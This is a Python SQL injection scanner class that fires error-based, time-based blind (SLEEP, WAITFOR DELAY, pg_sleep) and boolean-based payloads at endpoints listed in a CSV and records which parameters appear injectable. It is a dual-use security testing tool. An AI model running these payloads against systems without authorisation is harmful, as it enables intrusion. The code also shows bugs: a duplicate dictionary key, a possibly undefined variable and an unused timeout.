import pandas as pd
import urllib3
import logging
from urllib.parse import urlparse, urlencode, parse_qs
import requests as r
import re
import sys
import time
import threading
import concurrent.futures

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class SQLscanner:
    def __init__(
        self,
        base_url,
        proxies=None,
        cookies=None,
        dataframe=None,
        threads=20,
        timeout=20,
    ):
        self.base_url = base_url
        self.proxies = proxies
        self.cookies = cookies
        self.threads = threads
        self.timeout = timeout
        self.payloads = (
            "'",
            "')",
            "';",
            '"',
            '")',
            '";',
            "`",
            "`)",
            "`;",
            "\\",
            "%27",
            "%%2727",
            "%25%27",
            "%60",
            "%5C",
        )
        self.dataframe = pd.read_csv(dataframe)
        self.vulnerable_endpoints = set()
        self.scanned_endpoints = set()
        self.dbs = set()
        self._lock = threading.Lock()
        # findings: url -> {type, payload, param, evidence, confidence, db}
        self.findings = {}
        self.logger = logging.getLogger(self.__class__.__name__)
        self.setup_logger()

        self.BLIND_DELAY = 5  # seconds for time-based injection

        # Payloads that trigger a deliberate delay in the DB engine
        self.time_payloads = [
            ("' AND SLEEP({delay})--", "MySQL"),
            ("' AND SLEEP({delay})#", "MySQL"),
            (' AND SLEEP({delay})--', "MySQL"),
            ("' OR SLEEP({delay})--", "MySQL"),
            ("1 OR SLEEP({delay})--", "MySQL"),
            ("' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--", "MySQL"),
            ("'; WAITFOR DELAY '0:0:{delay}'--", "MSSQL"),
            ("1; WAITFOR DELAY '0:0:{delay}'--", "MSSQL"),
            ("' OR pg_sleep({delay})--", "PostgreSQL"),
            ("1 AND pg_sleep({delay})--", "PostgreSQL"),
            ("' AND 1=(SELECT 1 FROM PG_SLEEP({delay}))--", "PostgreSQL"),
        ]

        # Boolean-based pairs: (true_condition, false_condition)
        self.bool_payloads = [
            ("' AND '1'='1", "' AND '1'='2"),
            ("' AND 1=1--", "' AND 1=2--"),
            ('" AND "1"="1"--', '" AND "1"="2"--'),
            (" AND 1=1--", " AND 1=2--"),
            ("' OR 1=1--", "' OR 1=2--"),
            ("1 AND 1=1--", "1 AND 1=2--"),
        ]

        self.sql_errors = {
            "MySQL": (
                r"SQL syntax.*MySQL",
                r"Warning.*mysql_.*",
                r"MySQL Query fail.*",
                r"SQL syntax.*MariaDB server",
            ),
            "PostgreSQL": (
                r"PostgreSQL.*ERROR",
                r"Warning.*\Wpg_.*",
                r"Warning.*PostgreSQL",
            ),
            "Microsoft SQL Server": (
                r"OLE DB.* SQL Server",
                r"(\W|\A)SQL Server.*Driver",
                r"Warning.*odbc_.*",
                r"Warning.*mssql_",
                r"Msg \d+, Level \d+, State \d+",
                r"Unclosed quotation mark after the character string",
                r"Microsoft OLE DB Provider for ODBC Drivers",
            ),
            "Microsoft Access": (
                r"Microsoft Access Driver",
                r"Access Database Engine",
                r"Microsoft JET Database Engine",
                r".*Syntax error.*query expression",
            ),
            "Oracle": (
                r"\bORA-[0-9][0-9][0-9][0-9]",
                r"Oracle error",
                r"Warning.*oci_.*",
                "Microsoft OLE DB Provider for Oracle",
            ),
            "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error"),
            "SQLite": (r"SQLite/JDBCDriver", r"System.Data.SQLite.SQLiteException"),
            "Informix": (r"Warning.*ibase_.*", r"com.informix.jdbc"),
            "Sybase": (r"Warning.*sybase.*", r"Sybase message"),
            "SQLite": (
                r"SQLite/JDBCDriver",
                r"System\.Data\.SQLite\.SQLiteException",
                r"sqlite3\.OperationalError",
                r"SQLITE_ERROR",
                r"\[SQLITE_ERROR\]",
                r"SQLite error",
                r"no such column",
                r"unrecognized token",
                r"near \".*\": syntax error",
            ),
        }

    def setup_logger(self):
        if not self.logger.handlers:  # Check if handlers are already present
            formatter = logging.Formatter(
                "%(asctime)s - %(levelname)s: %(message)s", datefmt="%Y-%m-%d %H:%M:%S"
            )
            ch = logging.StreamHandler()
            ch.setLevel(logging.INFO)
            ch.setFormatter(formatter)
            self.logger.addHandler(ch)
            self.logger.setLevel(logging.INFO)

    def requester(self, url, method, data):
        if not (url.startswith("http://") or url.startswith("https://")):
            url = "http://" + url
        try:
            if method == "GET":
                resp = r.get(
                    url,
                    proxies=self.proxies,
                    cookies=self.cookies,
                    verify=False,
                    allow_redirects=False,
                ).text
                return resp
            else:
                resp = r.post(
                    url,
                    proxies=self.proxies,
                    cookies=self.cookies,
                    data=data,
                    verify=False,
                    allow_redirects=False,
                ).text
                return resp

        except r.exceptions.MissingSchema as e:
            self.logger.error(f"{url} has Missing Schema Error: {e}\n")
            return None
        except r.exceptions.ReadTimeout as e:
            self.logger.error(f"{url} has a Read Timeout Error: {e}\n")
            return None
        except r.exceptions.HTTPError as e:
            self.logger.error(f"{url} has a HTTP Error: {e}\n")
            return None
        except r.exceptions.ConnectionError as e:
            self.logger.error(f"{url} has Connection Error: {e}\n")
            return None
        except Exception as e:
            self.logger.error(f"An unexpected error: {e} occured for url: {url}\n")
            return None

    def check(self, response, url, path, param, payload=""):
        if response is None:
            return False
        for db, errors in self.sql_errors.items():
            for error in errors:
                if re.search(error, response):
                    path_key_combo = (path, param)
                    snippet = ""
                    m = re.search(error, response)
                    if m:
                        start = max(0, m.start() - 40)
                        snippet = response[start : m.end() + 40].strip()
                    with self._lock:
                        self.scanned_endpoints.add(path_key_combo)
                        self.vulnerable_endpoints.add(url)
                        self.dbs.add(db)
                        self.findings[url] = {
                            "type": "error-based",
                            "payload": payload,
                            "param": param,
                            "evidence": snippet,
                            "confidence": 0.90,
                            "db": db,
                        }
                    return True
        return False

    def _timed_request(self, url, method, data=None):
        """Send a request and return (response_text_or_none, elapsed_seconds)."""
        extended_timeout = self.timeout + self.BLIND_DELAY + 3
        start = time.time()
        try:
            if method == "GET":
                resp = r.get(
                    url,
                    proxies=self.proxies,
                    cookies=self.cookies,
                    verify=False,
                    allow_redirects=False,
                    timeout=extended_timeout,
                )
                return resp.text, time.time() - start
            else:
                resp = r.post(
                    url,
                    data=data,
                    proxies=self.proxies,
                    cookies=self.cookies,
                    verify=False,
                    allow_redirects=False,
                    timeout=extended_timeout,
                )
                return resp.text, time.time() - start
        except r.exceptions.Timeout:
            elapsed = time.time() - start
            return None, elapsed
        except Exception:
            return None, time.time() - start

    def _sqli_time_based(self, url, method, params, base_url):
        """Try time-based blind SQLi on each parameter. Returns finding dict or None."""
        threshold = self.BLIND_DELAY - 1.0  # allow 1 s tolerance
        for param_key in list(params.keys()):
            for template, db_hint in self.time_payloads:
                payload = template.format(delay=self.BLIND_DELAY)
                test_params = dict(params)
                test_params[param_key] = payload

                if method == "GET":
                    test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
                    _, elapsed = self._timed_request(test_url, "GET")
                else:
                    _, elapsed = self._timed_request(url, "POST", test_params)

                if elapsed >= threshold:
                    self.logger.info(
                        f"[Time-Based SQLi] {url} — param '{param_key}' "
                        f"delayed {elapsed:.1f}s with payload: {payload} (DB hint: {db_hint})\n"
                    )
                    return {
                        "type": "time-based blind",
                        "payload": payload,
                        "param": param_key,
                        "evidence": f"Response delayed {elapsed:.1f}s (threshold {threshold}s)",
                        "confidence": 0.75,
                        "db": db_hint,
                    }
        return None

    def _sqli_boolean_based(self, url, method, params, base_url):
        """Try boolean-based blind SQLi by comparing response lengths. Returns finding or None."""
        # Get a baseline response
        if method == "GET":
            baseline_url = f"{base_url}?{urlencode(params, doseq=True)}"
            baseline, _ = self._timed_request(baseline_url, "GET")
        else:
            baseline, _ = self._timed_request(url, "POST", params)

        if baseline is None:
            return None

        for param_key in list(params.keys()):
            for true_pl, false_pl in self.bool_payloads:
                true_params = dict(params)
                true_params[param_key] = true_pl
                false_params = dict(params)
                false_params[param_key] = false_pl

                if method == "GET":
                    true_resp, _ = self._timed_request(
                        f"{base_url}?{urlencode(true_params, doseq=True)}", "GET"
                    )
                    false_resp, _ = self._timed_request(
                        f"{base_url}?{urlencode(false_params, doseq=True)}", "GET"
                    )
                else:
                    true_resp, _ = self._timed_request(url, "POST", true_params)
                    false_resp, _ = self._timed_request(url, "POST", false_params)

                if true_resp is None or false_resp is None:
                    continue

                len_base = len(baseline)
                len_true = len(true_resp)
                len_false = len(false_resp)

                # Vulnerable if true ≈ baseline but false differs significantly
                true_similar = abs(len_base - len_true) < max(50, len_base * 0.05)
                false_different = abs(len_base - len_false) > max(100, len_base * 0.10)

                if true_similar and false_different:
                    self.logger.info(
                        f"[Boolean-Based SQLi] {url} — param '{param_key}' "
                        f"responds differently: true={len_true}b false={len_false}b baseline={len_base}b\n"
                    )
                    return {
                        "type": "boolean-based blind",
                        "payload": true_pl,
                        "param": param_key,
                        "evidence": (
                            f"True condition: {len_true}b, "
                            f"False condition: {len_false}b, "
                            f"Baseline: {len_base}b"
                        ),
                        "confidence": 0.65,
                        "db": "unknown",
                    }
        return None

    def sqli(self, url, method, data=None):
        scheme, domain, path, _, query, _ = urlparse(url)
        base_url = f"{scheme}://{domain}{path}"
        params = {}

        if query:
            params = parse_qs(query)
            params2 = params

        if method == "GET" or (method == "POST" and params != {}):
            found = False
            for k, _ in params2.items():
                if (path, k) not in self.scanned_endpoints:
                    for payload in self.payloads:
                        params2[k] = payload
                        test_url = f"{base_url}?{urlencode(params2)}"
                        resp = self.requester(test_url, "GET", None)
                        if self.check(resp, url, path, k, payload):
                            self.logger.info(
                                f"[Error-Based SQLi] GET {url} — param '{k}' payload: {payload}\n"
                            )
                            found = True
                            break
                else:
                    with self._lock:
                        self.vulnerable_endpoints.add(url)
                    found = True
                if not found:
                    # Try blind methods on this parameter
                    finding = self._sqli_time_based(url, "GET", params2, base_url)
                    if finding is None:
                        finding = self._sqli_boolean_based(url, "GET", params2, base_url)
                    if finding:
                        with self._lock:
                            self.vulnerable_endpoints.add(url)
                            self.findings[url] = finding

        if method == "POST" and data is not None:
            found = False
            for k, _ in data.items():
                if (path, k) not in self.scanned_endpoints:
                    for payload in self.payloads:
                        data[k] = payload
                        resp = self.requester(url, "POST", data)
                        if self.check(resp, url, path, k, payload):
                            self.logger.info(
                                f"[Error-Based SQLi] POST {url} — param '{k}' payload: {payload}\n"
                            )
                            found = True
                            break
                else:
                    with self._lock:
                        self.vulnerable_endpoints.add(url)
                    found = True
            if not found:
                finding = self._sqli_time_based(url, "POST", data, base_url)
                if finding is None:
                    finding = self._sqli_boolean_based(url, "POST", data, base_url)
                if finding:
                    with self._lock:
                        self.vulnerable_endpoints.add(url)
                        self.findings[url] = finding

    def scan(self, url, method, data):
        self.sqli(url, method, data)

    def gather_results(self):
        self.dataframe["SQLi"] = 0
        if not self.vulnerable_endpoints:
            self.logger.info("The endpoint is not vulnerable to SQL injection\n")

        if self.dbs:
            self.logger.info(
                f"Retrieved database(s): {', '.join([db for db in self.dbs])}\n"
            )

        for endpoint in self.vulnerable_endpoints:
            self.dataframe.loc[self.dataframe["URL"] == endpoint, "SQLi"] = 1

        path = (
            f"{sys.path[0]}"
            + "/results/"
            + self.base_url
            + "/DF/"
            + f"{self.base_url}_sqli.csv"
        )
        self.logger.info(f"Saving results of SQL injection scan into {path}")
        self.dataframe.to_csv(path, index=False)

    def run(self, row):
        target = row["URL"]
        method = row["Method"]
        data = row["POST Params"] if row["POST Params"] else {}
        self.scan(target, method, data)

    def start_scanning(self):
        try:
            self.logger.info("Launching the SQL injection exploit module\n")
            with concurrent.futures.ThreadPoolExecutor(
                max_workers=self.threads
            ) as executor:
                executor.map(self.run, [row for _, row in self.dataframe.iterrows()])
            self.gather_results()
        except KeyboardInterrupt:
            self.logger.info("Keyboard interrupt detected. Exiting from the program\n")
            sys.exit(0)
        except Exception as e:
            self.logger.error(f"Error: {e}")
            raise
